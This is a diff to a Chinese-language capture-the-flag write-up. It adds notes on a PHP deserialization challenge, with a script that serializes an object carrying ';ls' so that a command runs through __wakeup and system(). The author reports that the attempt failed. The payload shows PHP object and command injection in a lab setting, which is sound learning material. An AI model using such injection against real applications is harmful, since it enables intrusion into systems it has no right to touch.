@@ -22,8 +22,6 @@
 
 pdf裡面藏白色文字 全選起來用editor解答
 
-## Misc
-
 ## Pwn
 
 ### 0x01 (BOF)
@@ -112,6 +110,37 @@ print(r.recvline())
 requestt出去就拿到flag了
 
 ### 0x02 (serialize)
+
+將`__wakeup`中的this改成想要執行的指令(wakup函式在反序列化時一定會執行)
+
+```php
+<?php
+
+class MyFirstCTF {
+    protected $test = "CTF";
+    function __wakeup()
+    {
+        // print "Wake up yo!<br>";
+        // system("echo ".$this->test);
+    }
+}
+$obj = new MyFirstCTF();
+$obj->test=";ls";
+$ser = serialize($obj);
+
+printf($ser);
+
+
+// $input = $_GET['str'];
+// $kb = unserialize($input);
+?>
+```
+print出來的字串是`O:10:"MyFirstCTF":1:{s:4:"test";s:3:";ls";}`
+
+但是丟出去之後沒反應
+
+猜測應該是protected的關係
+
 
 ### 0x03 (math)
 ### 0x04 (math)
